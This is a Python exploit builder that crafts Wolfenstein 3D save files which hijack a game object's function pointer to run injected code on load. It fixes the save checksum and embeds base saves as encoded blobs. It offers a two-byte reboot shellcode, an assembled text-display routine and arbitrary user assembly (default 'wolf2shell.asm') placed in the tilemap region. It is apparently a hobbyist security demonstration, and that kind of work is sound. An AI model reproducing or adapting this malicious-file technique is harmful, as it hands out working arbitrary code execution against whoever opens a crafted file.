#!/usr/bin/env python3
"""Build Wolf3D SAVEGAM files with injected payloads.

Examples:
  python3 make-save.py --slot 0 --payload reboot
  python3 make-save.py --slot 1 --payload text --text "Wolf2Shell by Hypn"
  python3 make-save.py --slot 2 --payload asm --asm wolf2shell.asm
"""
from __future__ import annotations

import argparse
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEFAULT_OUTDIR = HERE / "savegames"

# Save layout (non-SPEAR, 19273-byte saves)
SZ_HDR = 32
SZ_GS = 66
SZ_LR = 80
SZ_TM = 4096
SZ_AT = 8192
SZ_AC = 1369
SZ_AP = 74
SZ_OBJ = 60
SZ_END = 2 + 3200 + 128 + 640 + 10 + 4
PLAYER_OFF = SZ_HDR + SZ_GS + SZ_LR + SZ_TM + SZ_AT + SZ_AC + SZ_AP

# Full-game BSS/DGROUP-relative offsets (confirmed for retail Wolf3d.exe).
DEFAULT_OBJLIST_OFF = 0xB51C
DEFAULT_TILEMAP_OFF = 0x75BA

VERSION_DEFAULTS = {
    "retail": {
        "ext": ".WL6",
        "dgroup_rel": 0x398D,
        "src": HERE / "wolf3d" / "saves" / "SAVEGAM0.WL6",
        "objlist_off": DEFAULT_OBJLIST_OFF,
        "tilemap_off": DEFAULT_TILEMAP_OFF,
    },
    # "shareware": {
    #     "ext": ".WL1",
    #     "dgroup_rel": 0x398D,  # confirm for shareware build before use
    #     "src": HERE / "wolf3dsw" / "SAVEGAM0.WL1",
    #     "objlist_off": DEFAULT_OBJLIST_OFF,
    #     "tilemap_off": DEFAULT_TILEMAP_OFF,
    # },
}


def parse_hex16(label: str):
    def _parse(value: str) -> int:
        value = str(value).strip()
        if value.lower().startswith("0x"):
            value = value[2:]
        if not value or any(c not in "0123456789abcdefABCDEF" for c in value):
            raise argparse.ArgumentTypeError(f"{label} must be hex (e.g. 0192)")
        n = int(value, 16)
        if not (0 <= n <= 0xFFFF):
            raise argparse.ArgumentTypeError(f"{label} must fit in 16 bits")
        return n

    return _parse


def checksum(save: bytearray) -> int:
    """Wolf3D DoChecksum XOR-pair checksum over the same regions as the engine."""
    off = SZ_HDR
    cs = 0
    for sz in [SZ_GS, SZ_LR, SZ_TM, SZ_AT]:
        buf = save[off : off + sz]
        off += sz
        for i in range(sz - 1):
            cs = (cs + (buf[i] ^ buf[i + 1])) & 0xFFFFFFFF
    off += SZ_AC + SZ_AP
    off = len(save) - SZ_END
    for sz in [2, 3200, 128, 640, 10]:
        buf = save[off : off + sz]
        off += sz
        for i in range(sz - 1):
            cs = (cs + (buf[i] ^ buf[i + 1])) & 0xFFFFFFFF
    struct.pack_into("<I", save, len(save) - 4, cs)
    return cs


def resolve_dgroup(args: argparse.Namespace) -> int:
    defaults = VERSION_DEFAULTS[args.version]
    if args.dgroup is not None:
        return args.dgroup & 0xFFFF
    psp = args.psp if args.psp is not None else 0x0192
    dgroup_rel = args.dgroup_rel if args.dgroup_rel is not None else defaults["dgroup_rel"]
    load_segment = (psp + 0x10) & 0xFFFF
    dgroup = (load_segment + dgroup_rel) & 0xFFFF
    print(
        f"PSP=0x{psp:04X} load=0x{load_segment:04X} DGROUP_REL=0x{dgroup_rel:04X} "
        f"DGROUP=0x{dgroup:04X}"
    )
    return dgroup


# Embedded clean base saves (gzip + ascii85) so the script works standalone.
EMBEDDED_SAVES = {
    "retail": "ABzY8000000{`t>ZEO_B8J?N--R<0+&lqEDgU|MzjWHNwiuv%xxUEBf92HU`6{-1Ak%SVJR#htzt5xYAQ^*Gd0!fG}RTXg}VLRY2)%ZS=s<k4eKM+-ssMJ5G35cj|gj7|HS~Ws)=bhczoBg~`->;kX?#%AaGtc|J^X@ydbL$tM|H%tqLH!6LG%`4{fTyEpP99x7rc6is5hQ|g>Fd8nNI}Pu%F38;*5pGiXaj0MYniYu5w^h}J19iIQpYdzzr2Znl4Gufd0QZ0h?mO1d-LN05^xY!Q^8n6)Uhj!ndIXq3d1VA$g2`E_UafG=lVtGB)bQ60QU+>X*d!O`JtL$ukP3RWu*(@$3}IggF>)`CvZ**lz+^WvGk;D|7O<~>hwBiwd`dB^jZ#I*NmE7&F{u9xdT4<#zE|5M5qIvuVAbG+#uMa4`lmG;uuB~or>L>u=u#m>2+6d#S`VpGh<5bT;U$6$o9eB&w#^Sf(ycHal`8gVbZ-mme2NirE{Y<@P6#&AH+pIQYgRoJ<kZ?_mEC|wuvXd*IiObZ1a##VfPeEf7>_?UOHHkZA8lR?CQm^o|q(l7DD}!K+Wu$Dkmr13_Nz~QI)FtAM6GqczEJ)h=bS}fPi1b92pMdH6OGo4ABCw*EHju_*H;$EZ=Q-o`RbEio=+f<LA4M59&2FU>NE4Gx#NoQ5kQSKOEBWLE|E;%1lM6c2JXVCMiu`Nm7YlR6Q&Ywcj*KN$ILww(0*1`Q|G|>4J3ivRoxl82=$RezidTDc4@JLGrC6JG`Bg`_Iw-#sDhJPx&#A{e}NRycGRU-1?t-;st*lar0l<|4(!O4_jtZ+IVR7Uz_|~g0KaT9p$HBOx+f$1#cZuc*G<oe%0~$cf=Dy51mV@q=0Fw{?J*jQm$tKlU{6u90$B}yecG7RrfxX>M^TGJT*^#X-WLj<5Hshd@B{Ndy1O8m@G+u{@hZP7OOw_Db<1>;N^Hxpzt8{`9nNxQnhIPCFASnE0Uke@k^y;@T1c7m*C~`tF%1*QAzfvX8Bd0O3Sc+(a%4B;Hgg=b}248QB!iAw&mZ5zKf$)QlvBOPMuUccPxJ+#)~B`VTFTKfM4*wR21`Mrc(Suf>QLy721fAYi%mhnw55^POpRX-Y?hwgmVysOI{_*`PZu!R8FGO_;Y?^_Bmo`Z|;f3wAs@{nUrXM<26=Zkm2Xz{%{&0V(|tnF;zx?t#oHu_9I0<5=T$OMsJnV|FSiaMMJkUWLsS|OVwP040RT!v!+&Gc3^tVk-v_yqoO6iCFqY`^jFXurYESlo=B!dJ0j*Qj;qz?{wF5iE#*0I^M5%CnRO?&8pzTHD#;U_{W$+fV~z^N^K14#V~KycO_5@x;(#vC{@51Z^N$Uc;g{zdrH&z*?OrcK=kmwU()`XG#lk6M^Znx5Aw}AcR9ydZaFA9~rOY89ejLdbZ#!a&W~J+2Dwb4i-o{tUvc=j?EIKK9p6^1Qz)NL}JLT(N>bUE~AGU0oP5k;S)bC=UX1$*3y1DC5^6+EJ_~*W<h;lCZC~`YTknIy}51E*tWW*$0f9pKQja_<=7w^-?FWgpsbM*D%#|6eH6-n>$w%p2(Z2Y+`XtKXj;CrT%{<+-DAGFMBf+qgQDYO6C^>_9$YU010&GGvR(qDK2GTFgCP71H0`caf%d($|(B1xn=@ISLG^Sh;>!!^~VuIk!~Q~%3)!OszAQ%=ZN9Ijn(VY%$eAINL}V)Um)>#tV0|EbjXs;T^zQF>eIe_E9P%TX}*e(@+R{NL*Jxw6~ySD61><F6Rqtj|9w`uV3W@$brVetv9=zoe-6tA2o7<Ns-?*TZ?%<Z|(c<c+`i?Vsy|a2|f^_~&JRYIvsEFVsBz`QA~C4?d)K7AO9~$N$3lVFR7c@pedsR$I*@op)U-^=D;Pda>gyrx5;P=2w;4sOia)M?L5HRpt4q=gKdwqW<=DFH>#%=k}aeREMA1{O)2^{EwRWbEEHC_dhi@dFChh-R2jSwY=EQn`WC-8t>FK<u|9k46=CN+UidoXLF+ek27gnv(?jItZ`Md|DEEU+5gol^Q%?VpK_azr=9Fy4gaSO^M85v@6+?O<i{@dU;FW&O7FTpOZ>rA*r>-=?pk*()lx0hQZ1GL&s7y`g}oTJi4PLcM3n6b6h#S_Pad=+7E%>-svV0@N+x1#rzpk-iXKb-Ht7qBE6eT6cI;NRhtO6O^2FX*e#U|Ync1XdVjUYK*BOf@PS|kjiUrGVO*C<A6T^0UV3Vmk4l;+?-iX4e(UbRVO8cSJjE!?_oM9CY>`E$`vdi4e_VuV4t@o7qaq6srHU3FyqLb|#Q778y$vd20vG6hvnFz3b6AB>M-Ld28#}3#L&OO4IyF9Rq>ESeHtt;p{U>|Vou>kiiKl3b~2li2VoMC+o`zyfyonue*a_km{#U9wc%p$`E8ONy(jM`_kKH7&K{-qo3V;<RMdv5L-q8!gWN^1*tKVaAkzX#q6UmIrlezYI;Gmm!1PG<TtnA_^St}pO1v91oV7I%8u`CjID#_k)t*gk-Ep#kF~BPVQYb~0nu7cpJ;aqNDE^^*BW_Fl%`zu=RD%qIt#rQLZiXIryop9E|Rm%D{Y?S;LaJ(ATv#kmz##ZoW#=LGXAh*!Tv7x3eaPH{{9;BwY3GsK)x7IQ{zv98VZ#n<iZ>S_bJ`n?a)w>$hN|8sSCbtk($bQDc~gY9r0VU}dm_SNtD21ib8KJlHd)yV2e^fao6PZuvn)uXc!*3MS-uk(=m={r;Hh|~w@Cp=ea=X56`l+tH;-bp{1h2D$Pcjh49LZ6+7+#j6OaKTSCT(E08hDeA8pX0b~!RHnr-yWRgd4KTJg)T&b{?NM`E_7eRg<={m^gPd-LigWa2VN11-GDqEdUp;YT7T$1Z^s{gPs4{FX!vlP<F<v5@%Fce-{X0I_yNxYk%v=&QzJdoa84t~r{U+9P~;)c!;zjDUa#S^DR8S$!)ILn`i2)~;N0IhJ+%#fqG_C-2ECga|HkEuub-KN+~4&66z~U{{=xC}P2cA@vf=u*&4|<~8$Q3b1?p|MuGQP{InPP+jcdG}jkCO+EgOG0zaDs6=BDAiy=7n)^lNY3$@6IIk7l7g(zd{Hfwq56Z9=56y=`zdibzAW?Z^DSf79X=+z)PA<n6>aE%NpQoBuThdXnf8$9F}C=IUAA6CIj|d|!0wH_+Y_(WNDDw~^?-mq6|V(V?4=k49hQd7$HqDX3rHF+KzN=8i9JK)$VGd;#*&j&WX3?cB@x!<~C)Adkj=It%?6kEMBkZjJqS9&)uiq1Ee7@Os1Di6!_~@I?2|mO!47?*H-gK+l&NZ_g=>x93ZZx91e+J+NiuCe$arzvcQ3_a0d41wDEnFKq?hzTatf*tR+aqm6(2ie{(nE1ds{?JG+vB8sp7G`B0+@sZX)J3ivLkpbmq8{h^%=D5h<$6Vg{u0QbmO}o|WVE^`^L$mNfMs(=hEVL8fbBo{a-E(UmB3WerA7{D|SszdQN$dB-rFp2=mw0Lca2=y}XL-A$cQxGT-Fe9SM!&THeh~lapXZ={M=T9~5vk2SYpIrMsg`P~mTIY%yi<Ef{F6eTQHnQ+^{0kLaV^*^u8|f|3bu<<+$i~C8e#|Tj|uEvqZI5l5PE3<@7^KqHV%qX>mcSI39)*+wR$^oXh>Y^+9T@q7^SX+RvN@T30$!?xLT@S`uT?#{U3))HY!O=000",
    # "shareware": "ABzY8000000{`t>Uu+b|8K0f?op<ieHa^?fhP$(U_L)BhOfWGV#wd<cbhHSymD)-u;-P9DimFB>QL3UyH3dRq0{I6o;4{S7NEqLplUC%RYL!0JQrq;Um3V0S(4q*bk0E(UOY6=zv$Hq*_xAp9PdDq`ncbb={J!s-Z@-zHTYvk7@4xus%P*WlE(uHJXXX%6(GQSD%L?19DS*0BC;AzBl1Z^8OgH$W2NmmAn%HIbS2AHxa>|vkWD6J!alQ(?H^1T|0SBfvRYl>5CVGW3<5K)srC5~}SyhauUY}CLxqi_($?gFiz`R0I8jjdQeyA4Is|R&{S!qA~icy{FpkhVBV>rh?<)1QTG(9WZzst3SCcVx%p1o#(E*9}kU8u{|{BHb`J1EodOe<bSggW5)s$$ij8AS2u1KIwPIEK+grz&nuSbW^(^tvm!;<5Vd*(tSnt}>5QW&0@J&w#^StoXw7xZ(ALQ0XpDm9l+F>D=fId{FW759}fz_RH^m&oe><J*4B$HumKAx{Lk9HV^4kdQY|Vw~b@^t?7zvBT|WHS1(5NL?sE*5E_&O>Y~>)IXUTO;1#DH)rhA5!EPWzM`w<P8Hk<%2>3<Jk>N02vq77{5H0X}O*7t!UjrD!vfYMfDa7Sh9mc#OKihSDNUzC(5v1GC;Fl~$WV~JeNLa^*jEl4?H5DQJpk?085R$o)Aril+dQ={2ziyN=(p9-^)BhLp%?n29P3h{}a+PL({72mQHJ|zuraiYo=DiF(T+PV+=V*Up02SsZ>{!D7!ha!NivGuL{ZBmcg1-s7`LFE%XPEy-EHf!S9$Nj^CO?xPV!<np@)IzoZVSzVw~i<*Vqz1&=J@<O;xQ&i-pFX!$Fx;{=qy(W)6>VKS20441Kv4a`AJ06y-y>0%qkO4%#&YI5x?}fR46~&D#h!bqGc{+D$<`lw?rf5>JNTOc<=+f94~wd4?@o#VPTVKW$P~)UpHTw{6vml8mWRGRi?iLuZ~|M)#;BavOh7)uLU$xh5gHZ{@DXh0({sdO4*5+lIygs^oI3a9C=BV&iI`ssdn*L{f3PfOQnJp4qO9%!F#?e=12Kj@e2tm(O;?2hK-!JsY+{B{7#cz2kE_Et^G0Mzy_DRN>=o**Da``M3wPd*Xqpe*gX;F&7LO8xI+6Iud(ui3_BP1XLAT)i#I3|Q*HF;rR0k2N2-3rj-IF(y;V*B%hp5|4c*S{tE*<Ix+;*N$-;Eb)aq*vOcx#bn<zUfTLPs5{S_DeRrHSO2`aBAuC0i6M9fzmSF6qak4?T?$#dZ5|8f*E>yB+TkfjY&ktaI)ap{r992Lsv=k`8piGRgSm13mofUeH|iY>mE9vf=IFV8nB9YeV7E?1#*^<!vderJwiCsvTn_seSsmuWv-bN#EqL5k)onL|MQxLqjUcGwinD%ZbKEUwwS4bp=`xwaFFPHKtg+s_mDRu$t;_4-#j?mF>DEE~5;P@jbcT`bh4*V9}#cl~h*e#J8Wxo;XGj7vU>+|CiA`wZQ~CMGC}B=on=bKKaa_jvI>ZT!M*<u^xPFMh>mjM9+w9&gL7{K&>%+(IV%t3KZ|o%Ao}X8w?6RueMuAIq8j&#u3-j}a4pVztO0@TI@-1Z1*<eVi0tMf9U6!S=3kc14m%bKqaTEAzXhki#|2rLN}Mic|l~dcn^T_g9>d7aXp=>B921D}QrI`<J6XDO-Q7#{EyEzSm6U_l(k2ssBk?{x3(t;`_y+yzqak*B8rf&!0d4x5i&Fx>=upT=w%%T;kuuyQTRRTl~dk#oyzr$Tj|-k$OE+Vok0Xe{jk8TiX7`K8Tdyw~l{a_9upCn*Bm6!C&ef#rWVudS`Ls_dovo=Z6h+dV{rtYqZ*G9_hU65~)9Hv(l?L&T{<lmovYr)kaKDmOSb?&#!9FPdrzCNgegKr(K15+rPLMy`nz+#O8OG>f(RI#9thJpLG8dW0Plog5Pa^QCrK4ZPql~<ah4npKSk|wLG0K+Phx*6UW({x&P~>e{qegp8f9>?_~W?7PLC^YjxD0Fq^OCob0dFq5p}){9m5^2lV_&@+&U(fAZr$k=}I!miVL8VIv+}wQJpt)JTogNR3qeKUdYP6$Qn5#0LpzCQkP>ilem4Cl5S{g;W*IZdSx6B{KtbCuo2U6hoH!z0wyH5AXi?t{uCD?qReAg*~y!m1PSSWTumnnGJN1++Zx4IAKq$JhWixt(gvn?V#8}5A3xS{;`T#<_O)}Q3SPn^4?!L;ebstY?5MC4{S7dZN)Bg7u}<%3q?I;K9;+0V2yuLn(3qaM%0Hkdh*WZqB%1!^^lonx^F_w2zGbuTJD$wc7kzFQ09IQEY8p76o&oFN23!c!Lak(w}RBO0ut^YP=lsF_lm{ZwH$mXrlLOruZ~SIY>HwP58l&xoaaC6UW+T}vmbIhkE752l|<vTm-=nb&EE}C?&S|rY*fd-x(L$0Iy6rA9q4H^LOt3Y`zU`p53IV(2e@xg?!&vN1iL)#ysN-pMa{mko9;W&ZnV?*$jAwMvhaxVwn;K0bnesr44bA{FPU!_b`|XX3qCnYeR7mq+MV}7;bg(=lYs4Ja(7dyy|9VZ+Xen9&fj91Sn6f|oTgp{@#?4Ofbw{wQ`|bf`oKYEh&huq=1kgRU9ahjuf*#5dK>!Q^B<!tiRh_=SD#sj-Wj`rZaznMIB%tv)KFyoyMa_1J&&?O>(TWep>LuVYPsauxVE~`O553@?OuXBNIsv7A>7hTp2|Y5k)LGy5GI6t!16xw)Gg?}B>9}>De}Q0<iXG*jtlMKxX`KW0K#Ds`jFwag+5$@e0%5-%SS?cZucV`3WmSnxbPUqg<s;h@Gn{35gxm_fwtche(8P4li@FJK|~t~kKKlLf{`ydKC+kNBQG=Dw#cuRp#ANUFIhek*~|EvTgRC^TI(xWI47<5vheduxOIFU@<{6|^Q>OmzAU&^xNYA&)Ng6~Xdcdk?O+ApdP&;HzsiE%9qnl*Uo!gdTaX7k{xb*s%^edA-_r4GhQpnYuWv@UN$os1mx6kok9ob$gG^rB_228PosIuv?W8vTb}<S(-RoI6k9Gfi0rZRY%&<J(^YH?-hkKPdxZm76mEDAJd#v}&LLA|?c<=An{op3d@S#n3p0&RTFS7cZr<wjZ9$@(X`1xBcG#`qeUxa)-9=HST9f${(!QCd}Ut0#b55~{4d@}xfmNzF3XQ6&eVr?Gs&56SckZ((@EkQn+SY!3Hz6(r_NZ$n}M||K93($|r0kR1BmVqNnkZXe%dA-4ltls{?i+9>+o*w)YlV@V^8_RIsJam-v4t>IThmLaIp-&j^!PKQ?sE>zRnST3+FW(skJ%*1hZvoz|8@L^|eJcy2O>ldZ+i820@gCS7UDgm*10#Q(W9{tdWbGt(bTZt;&hIQka1V}lGhFLv_YHP`cMrSYvFG?ruzzgq`T~5A5g+?>0oqCKjj{W~dt*xw$y)dI-55kTnoJL{>#6iV7opzP^!rPIOH8JiKO`qp95<O-f_&@b(h~SV^3X7=-<WkaQX@4|BQ;VZHBuw_OR=!{Cxxv>DcL60pW52RwNRJ1hPy>66ceSSQ3?zQ#E4OP+9-vF4TMqJvqRi%9~Gq@S_<%bdqlnPn7G!zSJWFaO8sf$T3V^u8eAjQFa0L3p#KBzDw(@UO8@`",
}


def load_save(version: str, src: Path | None = None) -> bytearray:
    if src is not None and src.exists():
        data = bytearray(src.read_bytes())
    else:
        blob = EMBEDDED_SAVES.get(version)
        if not blob:
            raise SystemExit(f"no embedded base save for version {version}")
        import base64, gzip
        data = bytearray(gzip.decompress(base64.b85decode(blob)))
    if len(data) != 19273:
        print(
            f"warning: unexpected save size {len(data)} (expected 19273 for non-SPEAR)",
            file=sys.stderr,
        )
    return data


def hook_obj11(save: bytearray, dgroup: int, think_off: int, objlist_off: int) -> int:
    """Hook obj#11 state->fake statetype, think->think_off. Returns obj#11 file offset."""
    t = PLAYER_OFF + 11 * SZ_OBJ
    obj_end = len(save) - SZ_END
    if t + SZ_OBJ > obj_end:
        raise SystemExit("save has no object #11")
    # active=1, ticcount=0 so DoActor ticks it on the next frame.
    save[t + 0] = 1
    save[t + 1] = 0
    save[t + 2] = 0
    save[t + 3] = 0
    # state -> fake statetype inside obj#11 at obj+34
    fake_off = (objlist_off + 11 * SZ_OBJ + 34) & 0xFFFF
    save[t + 6] = fake_off & 0xFF
    save[t + 7] = (fake_off >> 8) & 0xFF
    save[t + 8] = dgroup & 0xFF
    save[t + 9] = (dgroup >> 8) & 0xFF
    # fake statetype
    save[t + 34] = 0
    save[t + 35] = 0  # rotate
    save[t + 36] = 0
    save[t + 37] = 0  # shapenum
    save[t + 38] = 0
    save[t + 39] = 0  # tictime
    save[t + 40] = think_off & 0xFF
    save[t + 41] = (think_off >> 8) & 0xFF
    save[t + 42] = dgroup & 0xFF
    save[t + 43] = (dgroup >> 8) & 0xFF
    for i in range(44, 48):
        save[t + i] = 0  # action = 0
    print(f"hook: obj#11.state={dgroup:04X}:{fake_off:04X} think={dgroup:04X}:{think_off:04X}")
    return t


def payload_reboot(save: bytearray, dgroup: int, args: argparse.Namespace) -> None:
    t = hook_obj11(save, dgroup, think_off=(args.objlist_off + 11 * SZ_OBJ + 48) & 0xFFFF, objlist_off=args.objlist_off)
    shellcode = bytes([0xCD, 0x19])  # INT 19h - warm reboot
    for i, b in enumerate(shellcode):
        save[t + 48 + i] = b
    print("payload: INT 19h warm reboot (2 bytes) at obj#11+48")


def assemble_bytes(asm_source: str, nasm: str, label: str) -> bytes:
    with tempfile.TemporaryDirectory() as td:
        asm_path = Path(td) / f"{label}.asm"
        bin_path = Path(td) / f"{label}.bin"
        asm_path.write_text(asm_source, encoding="utf-8")
        cmd = [nasm, "-f", "bin", "-o", str(bin_path), str(asm_path)]
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            sys.stderr.write(r.stdout)
            sys.stderr.write(r.stderr)
            raise SystemExit(f"nasm failed: {' '.join(cmd)}")
        return bin_path.read_bytes()


def assemble_file(asm_path: Path, nasm: str, org: int) -> bytes:
    src = asm_path.read_text(encoding="utf-8")
    if "__PAYLOAD_ORG__" in src:
        src = src.replace("__PAYLOAD_ORG__", f"0x{org:04X}")
    else:
        # If the file has an explicit org, replace common forms so the payload lands
        # at the requested DGROUP-relative offset when injected into tilemap.
        replaced = False
        for needle in ("org 0x100", "org 0x0100", "ORG 0x100", "ORG 0x0100"):
            if needle in src:
                src = src.replace(needle, f"org 0x{org:04X}", 1)
                replaced = True
                break
        if not replaced:
            # Prepend an org directive only if none exists at top-level.
            lines = src.splitlines()
            has_org = any(l.strip().lower().startswith("org ") for l in lines[:20])
            if not has_org:
                src = f"bits 16\norg 0x{org:04X}\n" + src
    return assemble_bytes(src, nasm, asm_path.stem)


def inject_tilemap(save: bytearray, payload: bytes, tilemap_off: int) -> int:
    tilemap_file_off = SZ_HDR + SZ_GS + SZ_LR
    if len(payload) > SZ_TM:
        raise SystemExit(
            f"payload {len(payload)} bytes does not fit in tilemap ({SZ_TM} bytes)"
        )
    save[tilemap_file_off : tilemap_file_off + len(payload)] = payload
    for i in range(tilemap_file_off + len(payload), tilemap_file_off + SZ_TM):
        save[i] = 0
    print(
        f"payload: {len(payload)} bytes injected at DGROUP:0x{tilemap_off:04X} "
        f"(tilemap slack {SZ_TM - len(payload)} bytes)"
    )
    return tilemap_off


def payload_text(save: bytearray, dgroup: int, args: argparse.Namespace) -> None:
    text = args.text if args.text is not None else "Wolf2Shell by Hypn"
    # Escape for NASM db string: keep printable ASCII/simple escapes; fall back to bytes.
    safe = text.encode("latin-1", errors="replace")
    hex_bytes = ",".join(f"0x{b:02X}" for b in safe)
    asm = f"""bits 16
org 0x{args.tilemap_off:04X}
start:
    push cs
    pop ds
    mov ax, 0x0003
    int 0x10
    mov si, msg
.print:
    lodsb
    test al, al
    jz .done
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    int 0x10
    jmp .print
.done:
    mov si, nl
.nl:
    lodsb
    test al, al
    jz .wait
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    int 0x10
    jmp .nl
.wait:
    xor ah, ah
    int 0x16
    mov ax, 0x4C00
    int 0x21
msg: db {hex_bytes}, 0
nl: db 0x0D, 0x0A, "(press any key to exit)", 0x0D, 0x0A, 0
"""
    payload = assemble_bytes(asm, args.nasm, "text_payload")
    think_off = inject_tilemap(save, payload, args.tilemap_off)
    hook_obj11(save, dgroup, think_off=think_off, objlist_off=args.objlist_off)
    print(f"payload: text {text!r}")


def payload_asm(save: bytearray, dgroup: int, args: argparse.Namespace) -> None:
    asm_arg = args.asm if args.asm is not None else "wolf2shell.asm"
    asm_path = Path(asm_arg)
    if not asm_path.is_absolute():
        asm_path = (HERE / asm_path).resolve()
    if not asm_path.exists():
        raise SystemExit(f"ASM file not found: {asm_path}")
    payload = assemble_file(asm_path, args.nasm, args.tilemap_off)
    think_off = inject_tilemap(save, payload, args.tilemap_off)
    hook_obj11(save, dgroup, think_off=think_off, objlist_off=args.objlist_off)
    print(f"payload: asm {asm_path}")


PAYLOADS = {
    "reboot": payload_reboot,
    "text": payload_text,
    "asm": payload_asm,
}


def build(args: argparse.Namespace) -> Path:
    defaults = VERSION_DEFAULTS[args.version]
    if not (0 <= args.slot <= 9):
        raise SystemExit("slot must be 0-9 (WL_MENU.C uses a single digit)")

    src = defaults["src"]
    outdir = Path(args.outdir) if args.outdir is not None else DEFAULT_OUTDIR
    if not outdir.is_absolute():
        outdir = (Path.cwd() / outdir).resolve()
    outdir.mkdir(parents=True, exist_ok=True)

    ext = defaults["ext"]
    src_used = src if src.exists() else None
    save = load_save(args.version, src_used)
    dgroup = resolve_dgroup(args)

    args.objlist_off = args.objlist_off if args.objlist_off is not None else defaults["objlist_off"]
    args.tilemap_off = args.tilemap_off if args.tilemap_off is not None else defaults["tilemap_off"]

    # Savegame header: 32-byte name field (null-padded). Checksum does not cover header.
    name_bytes = args.name.encode("ascii", errors="replace")[:31]
    save[:SZ_HDR] = name_bytes.ljust(SZ_HDR, b"\x00")

    payload_fn = PAYLOADS[args.payload]
    payload_fn(save, dgroup, args)

    cs = checksum(save)
    out_path = outdir / f"SAVEGAM{args.slot}{ext}"
    out_path.write_bytes(save)

    print(f"name: {args.name}")
    print(f"version: {args.version} ({ext})")
    print(f"source: {src if src_used else f'embedded:{args.version}'}")
    print(f"wrote: {out_path}")
    print(f"checksum=0x{cs:08X}")
    print(
        f"Load slot {args.slot} in-game. For quickload/F9, that slot must have been "
        "quicksaved/quickloaded once in the current session as usual."
    )
    return out_path


def main() -> None:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )

    required = ap.add_argument_group("(required)")
    required.add_argument(
        "--payload",
        required=True,
        choices=sorted(PAYLOADS),
        help="payload type",
    )
    required.add_argument(
        "--text",
        default="Wolf2Shell by Hypn",
        help='text to display when `--payload text` (default: "Wolf2Shell by Hypn")',
    )
    required.add_argument(
        "--asm",
        default="wolf2shell.asm",
        help="ASM file to assemble when `--payload asm` (default: wolf2shell.asm)",
    )

    defaults = ap.add_argument_group("(defaults)")
    defaults.add_argument("--name", default="Wolf2Shell", help="label for this save (default: Wolf2Shell)")
    defaults.add_argument(
        "--version",
        choices=["retail"],  # "shareware" supported in codebase, commented out for now
        default="retail",
        help="game version (default: retail)",
    )
    defaults.add_argument("--slot", type=int, default=0, help=argparse.SUPPRESS)
    defaults.add_argument(
        "--psp",
        type=parse_hex16("PSP"),
        default=0x0192,
        help="Wolf3d.exe PSP segment in hex (default: 0192)",
    )
    defaults.add_argument(
        "--outdir",
        default=str(DEFAULT_OUTDIR),
        help="output directory (default: savegames)",
    )

    advanced = ap.add_argument_group("(advanced)")
    advanced.add_argument("-h", "--help", action="help", help="show this help message and exit")
    advanced.add_argument("--dgroup", type=parse_hex16("DGROUP"), help="override runtime DGROUP segment directly")
    advanced.add_argument(
        "--dgroup-rel",
        type=parse_hex16("DGROUP_REL"),
        dest="dgroup_rel",
        help="override DGROUP delta (DGROUP = PSP+0x10+DGROUP_REL)",
    )
    advanced.add_argument(
        "--objlist-off",
        type=parse_hex16("objlist_off"),
        dest="objlist_off",
        help=f"DGROUP-relative objlist offset (default {DEFAULT_OBJLIST_OFF:#x})",
    )
    advanced.add_argument(
        "--tilemap-off",
        type=parse_hex16("tilemap_off"),
        dest="tilemap_off",
        help=f"DGROUP-relative tilemap offset (default {DEFAULT_TILEMAP_OFF:#x})",
    )
    advanced.add_argument("--nasm", default="nasm", help="nasm executable (default: nasm)")

    args = ap.parse_args()
    build(args)


if __name__ == "__main__":
    main()
